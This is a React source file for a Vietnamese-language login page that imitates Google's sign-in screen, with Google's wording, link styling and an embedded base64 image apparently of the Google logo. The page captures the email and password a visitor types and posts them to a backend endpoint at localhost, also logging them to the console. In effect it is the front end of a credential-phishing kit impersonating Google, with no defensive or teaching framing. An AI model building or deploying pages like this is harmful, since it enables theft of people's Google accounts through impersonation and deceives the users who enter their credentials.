import "./App.css";
import React, { useState } from "react";
import axios from "axios";

function App() {
  const [gmail, setGmail] = useState("");
  const [password, setPassword] = useState("");

  console.log(gmail, password);
  const handleSubmit = async (e) => {
    e.preventDefault();
    const infor = {
      email: gmail,
      password,
    };
    try {
      await axios.post("http://localhost:3003/api/auth/register", infor);
    } catch (error) {
      console.log(error);
    }
    console.log(infor);
  };
  return (
    <form onSubmit={handleSubmit} className=" flex items-center justify-center">
      <section className="flex items-center rounded-lg  px-[48px] py-[36px] h-auto min-h-[500px] border border-[#ccc] flex-col  my-[100px]">
        <img
          src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAXoAAACFCAMAAABizcPaAAABNVBMVEX///8aau0gbvH/vwAaauwkcfMpdPXWQSs1e/knc/Qxefgud/fRPSkAllUhb/L/wgAAnFjbRjIAkk0CoFv/xQXm7Pz5+/n19/7K2vv++fj/zybhVELNOijbUDzYSTQAXez/yhQAY+uRxafB0fwAiDem1LoAoVj88O6iufT/99/t9P4AjUKRy6r/ywAAlEX/0CbYPSWPsfX/8cr//fPrqqL66eelwfYWr3Dzysb21tL/0kbhYE/pnZRtmfjZ4v3/12n/xzn/7LnhjYSBp/Z1m/FBgvhQjfn/9NPjb2DlgXXyv7nxwLvTNRn/3oXNIQD/yklJgfD/2XX/4aVYkfi0yvzC5NPq9vBKtoOd2796pvsAV/D/55r/1l7id2nkiH3/10//4Zx5u5ZXr4C13soxoGbUU0TRTT963p/IAAAXj0lEQVR4nO2dDXvaRtaGkWKBAEcOqRWEHYRVugWT+g0Y8Brz4dgYjG3i4IjNlk1wst2m//8nvBrNSDOjzwFbaUt4rm17rREwc+vozJkzZ4ZYbK2/gWRFmR6Va1DloyNFkbN/dptWXhW52NcHYiodFySe581/JCGZTKfEbr8oV9Z3IBr1pv2hIEnJtKk4lmBI4jlNm8zKyurT/98/PPSv6L6vcqQP4kI6lUqnneiTyaTBHvwjcVxqUutF14q/gn792UP//BDRt1WKM0GIG9xTEL1guhvedDdJEr0ErL8wKa8w/V9+/sGtf0dFvqin4qIIwcclTht0+0dQtZme1jSOB/4eogfitdRMiagtf7Z+9QD/Q0Q2XymKkjGKmuTj0qR75LJopXwx4XkBo5ckXisMi6vo9b1t/kUk36V04ykDu4E+LUjdoux9lVycaZxEoOd5jusWI2nRn6lf/4kUvbeRZ6m0aGA3/icM+j7coSrlAU+i53mN0wPf8TfUCyjK+H/+NYpvKg4AeOBs0ulg8EByOc5JBHoj3EzWVtHr0H7n5wjiyuwMmLtJPj5kilnkrunzLfQA/soZvikS/f89vqfv6YIIlRaZjXea4kj0vNZfSbOn0D/6pyvI2Rjk0wuMl8pEkzB6bbaS5KNFP02nLPIL+ow+zO2Y5GuP3ay/iKJEfyRaig8qC763plmOfvbIrfrLKEL0R5azWdjmgYraatt8lOints2nJ0tEKNkCHGEftU1/KUWGXhEtP58aLJMIM9GvaGwDFRV6eWK5m5S4VC4AoF9hbxOLDn3XdvTx5cZJA/3qjrCmIkLfl0Tb3Sz3CdnCatt8VOiL9hCbSk2X+4jsf1Z4hDUVCXp5aA2xYnpZp5FddfLRoO/HbaOXll7mW+HYBioK9D1MPt59pM9cQUWAPmtFN2A1cIXXth+qCNCjyZQBXkx3F83dfEeKAL2eRuCNQXbJ8Oa70OOj70kpyB3E9Cu5vPRIenz0F3E7slwPskH65dkPPzxDehT0vUHKHmSlo8f4xFWVgf7Zo6IvxxF3Q/za3wTol2fPHhV9VodVlWaB3/DbTotyzVardXx8bPy7mVv2Q+r7l4eHZ2dnh4eX+/Ul3p+Ve4pSDJAd8y2GHnQO9a3kfQUcZKHi3zIX0Lo+vxq127uqmtndbY+uzq+bi3/I4ce7Tyc7O3sHBwc7Ozsnn95+2V/o/fK03x1ORDFpLSxztjSowoVtjnCYZUKfu+mAzuXVTL7dHs3PGy2Pi2oCRi99q9CydHyvZtRdrHzeaGVit7OI8dfPPh0c7O3t7UDtmTrY3nm7z1Yjk+2VRU2Km8Xrdhk7XcSelDjCGgF6FqsvHc8zap7uXCJ/7urbEPub1CL1Hw9QqTEnsOft9hktzN8fM37I/tvPByRz9B9Af+fukOEDihdiHATVKZO8N3qBJG+gZ3E4pcaINCq7c2r+nDZ9WSRc/VILg4uq1GnnEfP2CKitqnlbqjr3ejad2r/bgdZu/PsEaOdgD+tg71OY31F0s+4lFU8PBgMxnnTs3UDV6xy1AsHi63ONNqKtttvA4+QtswLwO6TXL6YIo19mNXxBGU2DNpFpd25aJaDWzXk7Q8BPNHyGJVv1j68h+IOTj2eHdUP7h2enBPu97b2PQUNupZ82Z/DxYa2o9HrF6SwlkeiTA3BDRJEe+xjQt64yZu/U3ftrMMLeNK6IruUTc2I8Kyct7sbXDiNP4DTnyCZG1wTfXLORVwnDbwcb/uEJ8jSfzwi+9f07Cv5nf8Pv6XFY2ji1htBsr59MYvTCUK4A0W8LR38NTT7f7pQsx55rzcmHmuhaX8B+LqlHHVs2kO9rXztfaZ5nCPaq63Ws+seD1yb4kzPnS5eftjH67R3X60iKafJiuks95IouYFfP6x5WGIY+14EPtNqhH9vrNmlXlt1nu7aXM9BHnUZoQCefmXuEkbnGWCXYN3w/5O61IcPXnHpYdf3ttgUeyJu9MoDLcc5JTFaXMHtJd7/xl+fB6O/RE+1qe5MYzdQRui/yMI7RR5zBKc2hH9y99379GBqHaqp67n3R/ucDE/3rj96vvyfRb3tdpKDdAx7edUbsTeXcMILR5+5R9zxitOZINYdZ0LPEHPoieZD+VuitpmXu/WL3m7FKyNPu65/3TG9z8Nbvaz5uE+g97F4eooyVxxzGsHscXPJl58vB6O/hI+3tK1t53LEqvMKILb8R+lwHjf0j/2uuMwT6qof11E/3gLPZObjz/xDT51jo95wRfnaGjN7DoQAcAo4ueed+yED0DdS9jnerGlW7Y5m26W97/LdCj8jv7gZEL7n7BEaf+eoeEU7RLOp1QORY/7xN6MRx5RSthca9c7RTEr2zIOnHAPQta/LkExiXdrFZJcwHuscR6IUI0R+jSWvGf/w0lCM9TsL1fHyB5F8f+MUupvZJ9Fun9IvWyoTkE0fPJDyn4hy3JwB9Ds1gMz5Gb5getqpEG9wfGn10cX0TTaTUdnCO7IYwe3XsuE2XprMxwspPwRnKjxR76jYdodqLlF8cLXM4jSA5ppgB6BtVNEH37d4x0bPxjfGHnkbMniNEf4+i9oxPdGMpNydamHDcp08oU3bgE91Y2j8h0b8j7lNFR8tCad8cLRxpYfKMo3Na/uhLuyrqnm/671glPM48BtAT8VQ8shxOa4yi2mpYgqZFtFCtUo8vcjcG+rAEzdkWyf49fqFo1fTGXeGLpV46aeVwkvyQeskffQdalprxnwpeJ+yOJapt4w71BBK9GNEZBzkrkaHuhiaFR4kMkAr+lcgTZl8/QUa/9zr0CymPs4f/blfZCb7p8eyFhNAnBYmj3JIv+mY7A6ck/jFEC/Urk6jejhqgW7JIok9GlDS+sW545ioU/fE4YymRIM3+4wFKzQdFlkhfLLPfMvTki/Xn7MAeZf17CoIc6G8EQaNsEaN/+vQV+cK1FTm2veObXLOjJkxrSlTz9+j2yAMSPef7GD5IubmFvhoY38CL2wmbfCKRt2+VYfRWSjgwvjG1v0egx95e5hnQV8QkNHqAnkoaI/RPgSj07YwVsXt9YOn6qlqFBj8e4eUqeZgk0PPRbE1oVm30N+FXN8YJQvYbzuyE/MFl+Ie83cLkt7atedXU8jcpIaD0QheSFnpqpQSif/rUhb5kGX3GY7rY7LQzCHzmqkU8FRVi6gxCnEhSl+d21JJgWINq5TH4TZzKOcHoGZZfzwijxx6nZoWWqXjALowjzvI3Ap3I+fH5U0vPSPTXvuhLN1fjqvkUV6vQw2PBQQV7nCiiy9zIdvV5hhWo3Khqk9/cHKH21vEq1GsG9HUS/dZn5HH6aQg+eNOSrFnkBZ5KN1jogdch0RumlfFyOKXOCHI3PM382DUM1HgKfRQlUK28PXCqLCuv2OMY6K1oFPubvR2WooPTLQL9FkIPKqphiWNQ2UtlICStU93cVo+8PYG+BIcy0D8Cfel4bhl8YuS57nZEWn2Sv2Do1aK6Nl2d2Tom9K1bAv0YOfu3C6I/e7KF9QSNDqAEAHqcdNwffVaXBHS0mIevf+by9UZoacl2OM0GNvgrt8GbUtJJK2kBPNyi+/MrcpDMS3Ln1cWsPkaQ36zC6W/9E7HszYK+vk2iR9Nf3TroJ5VypSUJ9XnkbxzL4gZ629kT6ImnGgaXpdZctQy+3fFNLVREIYklLBjZ94RCgODTWponMHqWaoPYvIrRb0JD2j/ZW8zq6yckepRDm1nn6KVSQsA4W+Os8/Q0CgcxzFLo7e5lQArHMPgx7HE1cXUTtMI/lDB4ZzQVJmXAuYq2cPUWKtsq4ecx45WDd8ty9ib6vPmnS1xmwxThxF7ckeg/wT/240SNo/97pxoyekmj8mc+6I/Jp7p11bYMPh9W0FXjEHV4gNkiBfZK3CDP+aDXrGGjqWL0Y4a4HmR8MPnNW/NPh4S/2WaI62Ox9yT6N/BvU1zkmA5Imkw1ZPSOjL0fejz/NnoI70NVvboOnbgrmmDLuAcLxDg90cPWnTZvoCdaxjCbjYEUGiZvod8m0IfPZmMgsnejlzlcdCT4z9wN9KYZOiazTOjNXo4T7io/D1UGkoUdSGLeK66kJPy0AFHkcdxMoQ/JGaN3mJG9P3rfdVlSl3tu9LGBXWqXjvs/3310fCcv0plcJvSJav6K6dkGX8TZnh5IYx1oewqtokagF3G/SPSJEUs5a2nugZ6osPnE0rz9N5C6qTdWXwW73ivtu40jewFP0XMNfCzoq2qHKZQwVUxKpO3y3SWTCdmCl7uh0WcyTJXE52ObPEaPtcfUnndPbPI2ekUkaopFn45WRAkaveB4LsKH2UzVd4HQS9khT5A3bvaSmWMKPeEkKfS3TDX0JHrV/AuFfpupPQA9Iv/kndXGbjKF10N9vL05+kmS5Br2woPLjF/5kI+MMNbmDs7tmyz0blsUeqJXTRXH9ZlxQEUflhFdWuQ34dz88IBEz1LDHTsl0NsuSiHXon0W5bo8cjfOp8IP/S7uYCLP0jRbFU6ysAMJ2nKJHAL9Bom+1CbQs42zjapNHr3hco9EH7I2C2Wgt8g/wQNzVyLLALxcThEcFGyE9G7H64O+SXQwwTZzsTXTEHTk7Zer9fZFPyd8obvAw0sEelSVQK10b4cvU8UAeiwcjvYGuNIx7jWBzOqm0XsdUOuDPjdf2tkbzSG9vRHkLJVEw+g3KPSxDomeKZVAWj28/sUpiX6HZVJFoieKEhRyEwPnOgw1OzAPqiXjBFs+6I0OGgEZ6p+ziiJMfY5CL3DLjLQ2+g0H+msCPdukikBv9eQtNc6yOHsCPVWCVuaJ+hd+RucL5S5AIWkzrzSiH/prcl2NbTSzVZGo+FLg00sdtmiTp9GDZSeMfs4QXmL01XN0OVXfsX0a/H5TBPov1Atl8sdu+AHxYwfZozh4/nmf5UM/9KVbAj2xnMykIyKbALw+t8QmB4R+w4U+hpedgBgeyPOxjd62Icrqtxn2CL7zcvWmpgKxSCFo3aMe6K2slCcaMEFu4PPQ+6GPtavLm322y+Ho0mS/uLuH6Dc80HeoB5LB49wjq3+5qdpJ189UWVN4GucFRv/OWSeoDCWi/kiSBkNd1wciPIef840yfNHTK/kLevtekpewljof1x99k2pZeORrxEQI/RjHooeUx/kc+iH7b2z0HrFo2ZhH2mtzSfO3h5DP5Sa+q0W+6Jsq2cHxYtOqWLlgU0daNLo30W94obfXPkyFR77Nr4j8yzGOh+pUeOmqm3fpEEf1XsWxlfJA4yT0G0MwfQif+7h/iOGLPndFudQxexbHVJ8jsJunEy+4ddxAv7Hhjb6VIdGHDrTHY4s8aT/vKY8TGtq/DzJ6U3J5pk8GZlInbpMPWivyRR9rJSipi7mcylCj0XMLntASgD63mNl3EPrNl6T51HcolxOyVFW/s8hvBVxZkc38azFtRxhawJqtP3pHJMEUxpHNEDkH+8X8fbaw4YfeWndCDQvz9glo8y/H9MyQNvuT4M/Yt/3Nl/CmF+0gQygEXBaAnuqg0UWmSTtWb+Bi7zmz8FEQ+tj9AkHO8S0kv/mHY035E2a/tRUS5HyxyL9haPqMs8gzon/+3IHeTLaSXQyv66Ukpx3sef9Ay61A9E0y9K0G7acC3slEv7npdEyHxMLT1tabIJdT37bQs+QcYNrGDHFCHc5zKCf65lfK5Szsc3oTF3u+zDq5CkQfO6ZmHUHtuq6aNv/S49l4T9U1BS1WvbXIvw+4yBb4AUs0offYLmvrx+dYPzlfvKGmtEYfQ04bcEo2Ii6n0+kyGn4w+liHbNrYP79XyiNHP/d48ZRi74/10iLPlOOMiThtK7i3y9oKRE/7VHNIC/CrOY/XZhzF3vh/mjZjgh+CHub3Qt19rl01bd77ga2fki5ny4993RpjWXI9hrqcTV7iC77BxY+vCPSuVEbuysE+Mf567Pl051qdTY9HIntU4LC3QYY/qTEMt2Hoc3Oqad7sc/fQ3YxH3mVb9R3S7n2G2rqVQzhlPAutZqWwzEmle3kK6b+E1b9y/xBeM091EGSgxh7VOKXr+5e33jULPd10OhzldYRZL8znyyHoHXO+ccfDIkojy+b9Cub2Tyj2Xqfe2CkEpsoFs+m8hMkbk8mJ58rhh99I9L+4L2iOyBppmP6r5u9vSqVczOhsLlcqNRvzl5vjTb8MW7aWpDw+XG3V9HIA/d60NuFC0BsOjvL37uOebtpjM7S59botSMZciaqmdMY59fdWcPOF/WcC+1Z0iXoses3kPzwl0D9/+g/3Fc25nXLFqo7H7atzoPuRemt0sKoG1On0upwFn1jq1lKT2dTt9mWldjEZGG/A5LmCz1h1rRKGP86fUxPu1nzTtPlxPjDtWv+4TcB/8uaONPwXZ5azYUhuYlUGvEBmsDjO/fuLL35/Tuu3//7yv3+BH0PFKt1Xq274wPirxh1AT3TI/g7lgtN4dymlphW4QbdfQ+p39YFW0DQNJ84M7pqW1P1yUE2wwQXDH9/ftJrgEK7mcaMNm7ZZvQ/LgFy+I9k/2bo7uwSHcNUvD9/a4fzbxY68VMzMLelinWuzH3575UD/ytBPP736nXq4bv7wMHzQrZdI4/Ow7mWVbkHTnOgRfywCOaSuFTYuij3/UTl3k7+tEr5wnB/N56NRuzo2p1HVW5+ogFL9CyCO4T/ZfgeE08QnTOUihCo1wTGj0YYU+xf/fu6pV88d423z/LbqAm/LcPMsU61KTee84eP1bxr7RO97eCSnrudVos4GPo0wXTbevGKtpfjyZusJUdlHauuUGXxF7hX73QlfKDjnkgZ7cq/Bh9+dNo/I/+7+nevWPWn5BPfN8VfmeoWKUhv42T4Cz22Yj0FBm1yUFZkt5VM67hjjjcM2quPbr40W++x7/+zOA7th8F+YasBj4Ifp+zoYozj8o6GOmbzN/sPvP3nLafNQrcbI6p+N3ehfe8Hza+Wj7iQlaB43wHQ4G6kBsHVlwbVcY1Yxb+dVMPyDNua/jq4ai7XLUP3w7t0bbPhbb96dsp6rWynORMGEbrp45ESdM3l82u0LP/l9QbNx1f5D3dw0+mc8Auof7SX6FwMnERbLtQt9IGrWVp2kmJroxnBbnhZ7S5+NmWsd39w0Go3rG2OsXfZD6odnZ++Bzs4OmY8zLvZTBmZQZGZCT070iz6Q7oDPaQ85r8Ps3zXq39KnZRvKZit4zxo4AzL7N/0xpOyRLsBSR46T4kNjdLL7ki2jNIq1VUb7BoeufjfKTgcaD8Frw5rLT/aItTrTqUZ+9Od3I1mH7t0APyh6BQUVvUBNJpes/V3LKeBQIPmhb+HBNE1NJjfWLucRlO1raM5aCErFKoZLIuK4aA6q+b5U6Vp+PBnsReQuGUlHf8b26uvCIh9aYZQl2Qet1q7FpLJNPnxHfIVgv/Y4D5VinykwYYkXdZu95nkE71rssost2PbD9wa22S/5g99rIU0LFnnGc2eKNvqgqqi1QpXVbaNnPbh5qK3RP4YUwULPPD0tWhuU1ugfJDu84ZljxWxyjf4RlO1yi6M3g5yNjfUw+yBlUzb6AvMMqa/Bjajr4PIhyuJUMPtmmZoGa4oW3lW2FqFKAaNnJtlH6L/FrwOurgj0HKv/yHZN9ItsMVjLLdvhGANnitGKjfFh7W8erixOCzDvEFMKsNhl7W8eJCoLnGSD2YVGH/WPA668jsgEPJO3V1BV3drTP1BKkqzdYsjAZ/W1p38k9ck1P4bFkgszvFnuUKa1KMnEoXiAfUjmGE6ntGXOBVrLqZpGsR8E5RPkISQvrqObxxAV5IBa3b4f/OzRAJJPrhfEH0dZkWLPaYLulbqvHE3MrBnns5ltrSUk6zR7UGSsl5WevSug0lOmFxrcFMZpF+v6m8dTpVvgOBd9caJ3L4C6+iSpaWiLTES/jvb9Chz9ZMneicRZ28OsP3Ja0nX+5VoPlWw5FF+B+3Cx9vJRSJ7Re3xp7pomTGrrYD4qydMLseAyfnNTsKa7dzus9aiqKGVdTEI/bzl+cVgrymvu30QgljyCKirL78Zb6++m/wfdWh5IKMQz1QAAAABJRU5ErkJggg=="
          alt=""
          className="w-[70px] h-[25px] cursor-pointer"
        />
        <h2 className="text-2xl">Đăng nhập</h2>
        <p className="text-base mt-[7px]">Sử dụng Tài khoản Google của bạn</p>
        <input
          type="text"
          placeholder="Email hoặc số điện thoại"
          className="mt-[31px] p-4 w-full border border-[#ccc] rounded-md"
          onChange={({ target }) => setGmail(target?.value)}
        />
        <input
          type="password"
          placeholder="Mật khẩu"
          className="mt-[8px] p-4 w-full border border-[#ccc] rounded-md"
          onChange={({ target }) => setPassword(target?.value)}
        />
        <p className="mt-[8px] self-start text-[#3984ea] font-semibold  hover:opacity-60 transition-all inline-block cursor-pointer ">
          Bạn quên địa chỉ email?
        </p>
        <p className="mt-[50px] w-full text-[#5f6368] text-[15px]">
          Đây không phải máy tính của bạn? Hãy sử dụng chế độ <br></br> Khách để
          đăng nhập một cách riêng tư.
          <span className="mt-[5px] text-[#3984ea] font-semibold  hover:opacity-60 transition-all inline-block cursor-pointer ">
            Tìm hiểu thêm
          </span>
        </p>
        <div className="mt-[32px] flex justify-between items-center w-full">
          <p className="text-[#3984ea] text-sm font-semibold cursor-pointer  hover:opacity-60 transition-all ">
            Tạo tài khoản
          </p>
          <button
            onSubmit={handleSubmit}
            className="px-6 py-3 bg-[#3984ea] font-medium  cursor-pointer  rounded-lg text-white hover:opacity-60 transition-all"
          >
            Đăng nhập
          </button>
        </div>
      </section>
    </form>
  );
}

export default App;
